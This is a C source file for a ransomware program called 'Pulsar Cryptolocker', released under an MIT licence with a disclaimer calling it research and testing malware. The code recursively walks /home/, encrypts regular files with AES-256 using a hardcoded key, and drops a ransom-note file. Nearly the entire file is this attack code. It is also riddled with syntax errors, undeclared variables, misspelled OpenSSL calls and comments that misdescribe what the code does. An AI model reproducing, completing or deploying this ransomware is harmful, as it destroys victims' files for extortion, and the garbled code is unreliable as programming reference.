/*
* Copyright (c) 2020 Timo Sarkar
*
* Permission is hereby granted, free of charge, to any person obtaining a copy
* of this software and associated documentation files (the "Software"), to
* deal in the Software without restriction, including without limitation the
* rights to use, copy, modify, merge, publish, distribute, sublicense, and/or
* sell copies of the Software, and to permit persons to whom the Software is
* furnished to do so, subject to the following conditions:
*
* The above copyright notice and this permission notice shall be included in
* all copies or substantial portions of the Software.
*
* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
* IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
* FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
* AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
* LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
* FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS
* IN THE SOFTWARE.
*
* I AM NOT RESPONSIBLE FOR ANY KIND OF DAMAGE BY USING THIS FILE. PLEASE USE PULSAR
* AS A RESEARCH AND TESTING MALWARE. THE PULSAR DISTRIBUTION IS NOT INTENDED FOR 
* ANY MALICIOUS PUPOSES. ITS ALL TESTING.
*/
/* developed by timo sarkar */


#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <openssl/evp.h>
#include <openssl/aes.h>
// install all the headerfiles

void ls_dir( char* start_path ); // define the start path for spawning pulsar
void encryptfile( FILE*  fpin, FILE* fpout, unsigned char* key, unsigned char* iv ) // define the stdin and out for file encryptions

int main(  )  {
    char* start_path; // call the start_path using char
    start_path = "/home/"; // asign the value 'linux home dir' to start_path
    ls_dir(start_path); // passing the start_path to 'lsdir' function
    /* system("pause"); is optional for using mingw-gcc toolchain */

    return 0;
}

void ls_dir( char* start_path ) { // initialiize a void function providing main informations about linux's partitioning-systems
    unsigned char key[] = '12345678901234561234567890123456'; // 256bit - 32 char key
    unsigned char iv[] = '1234567890123456'; // some 128bit random key used later on...
    DIR * dir;

    struct dirent * ent;

    if ( ( dir = opendir ( start_path ) ) != NULL ) {  // check if the opened dir is equal to home dir
        while ( ( ent = readdir( dir ) ) != NULL ) { // execute stuff while the current dir is opendir
            int len = strlen( ent -> d_name ); // declare and assign a new integer to the d_name expression
            
            const char * last_four =&ent -> d_name[ len -4 ]; // assign a new const for defining the last 4 blocks in the key

            if ( strcmp( last_four, ".pulsar" ) != 0) { // compare string of last four in the key block and the encryption format .pulsar
                if ( ent -> d_type == 8 ) { // check if d_type is equal to int 8
                    char * full_path_readme = ( char * ) malloc( strlen( "PULSAR INFORMATION" ) + strlen ( start_path ) + 2 ); // long stuff here declaring the full path of the readme message is
                    // need to shorten this part heavily !
                    strcpy( full_path_readme, start_path ); // copy fpreadme
                    strcat( full_path_readme, "PULSAR INFORMATION" ); // show and assign the ps info at the fpreadme

                    char *  full_path = ( char * ) malloc( strlen( full_path ) + strlen( ".pulsar" ) + 1 ); // same stuff here just using full path to assing the .pulsar encryption files
                    strcpy( new_name, full_path ); // copy fullpath
                    strcat( new_name, ".pulsar" ); // show and assign the fullpath to new_name and .pulsar format

                    if ( strcmp( full_path, "/etc/passwd" ) != 0  // check if  fullpath and /etc/passwd files arent empty
                    && strcmp( full_path, "/etc/shadow" ) != 0   // same here
                    && strcmp( full_path, "/etc/sudoers" ) != 0 ) { // and here
                        FILE * fpin; // assing current file to file process input
                        FILE * fpout; // assing current file to file process output
                        FILE * fpreadme; // assign current file to process readme

                        fpin = fopen( full_path, "rb" ); // assing fpin to file open at /full_path/rb
                        fpout = fopen( new_name, "wb" ); // assign fpout to file open at /new_name/wb
                        fpreadme = fopen( full_path_readme, "w" ); // assign fpreadme to file open at /fpreadme/w

                        fprintf( fpreadme, "The Pulsar Cryptolocker v0.1.1 
                                \n\n All files have been encrypted. In order to decrypt them do:
                                \n\n < do this >
                                  \n < do that >") // end readme message
                        fclose( fpreadme ); // close readme message

                        encryptfile( fpin, fpout, key, iv ); // encrypt all files including itselfe

                        fclose( fpin ); // close fpin 
                        fclose( fpout ); // close fpout
                        fclose( full_path ); // close full_path
                    }
                    free( full_path );  
                    free( new_name );  
                }   else if ( ent -> d_type == 4 ) {
                        char * full_path = ( char* ) malloc( strlen( start_path ) + strlen( ent -> d_name ) + 2 );
                        strcpy( full_path, start_path ); // copy fp and start_path
                        strcat( full_path, ent -> d_name ); // assing and show fp to d_name
                        printf( "%s\n", full_path ); // print full_path 

                        if ( full_path != start_path && ent -> d_name[ 0 ] != '.' ) {
                            ls_dir( full_path ); // show folder content plus fp
                        }

                        free( full_path );            
                }
            }
        }
    }
}

void encryptfile( FILE * fpin, FILE * fpout, unsigned char* key, unsigned char* iv ) {
    // use openssl evp to encrypt files

    const unsigned bufsize = 4096; // define the actual buffer size
    unsigned char* read_buf = malloc( bufsize ); // limit the max buffer size to read -> refers to bufsize
    unsigned char* cipher_buf; // define the buffered ciphers
    unsigned blocksize; // define the blocksize in  bytes
    int out_len;

    EVP_CIPHER_CTX ctx;
    EVP_CipherInit( &ctx /* refer to predef ctx */, EVP_aes_256_cbc() /* use AES 256bit encryption through EVP Openssl */, key, iv, 1 );
    blocksize = EVP_CIPHER_CTX_block_size( &ctx ); // use premade evp block-size and assign it to blocksize
    cipher_buf = malloc( bufsize + blocksize ); // assign the result of bufsize and blcksize to buffered cipher

    while ( 1 ) {
        int bytes_read = fread( read_buf, sizeof( unsigned char ), bufsize, fpin ); // assign values to int bytes_read
        EVP_CIPHERUpdate( &ctx, cipher_buf, &out_ len, read_buf, bytes_read ); // update variables using evp submethod
        fwrite( cipher_buf, sizeof( unsigned char ), out_len, fpout );

        if ( bytes_read < bufsize ) { // check if bufsize is bigger than bytes_read
            break; // write error eof to stdout
        } 
    }

    EVP_CIPHERFinal( &ctx, cipher_buf, &out_len ); // cipherfinal submethod of evp assigned to ctx, cipher-buf and outlen
    fwrite( cipher_buf, sizeof( unsigned char ), out_len, fpout ); // write cipher_buf, sizeof uchar, outlen, fpout to stdout

    free( cipher_buf );
    free( read_buf );

}
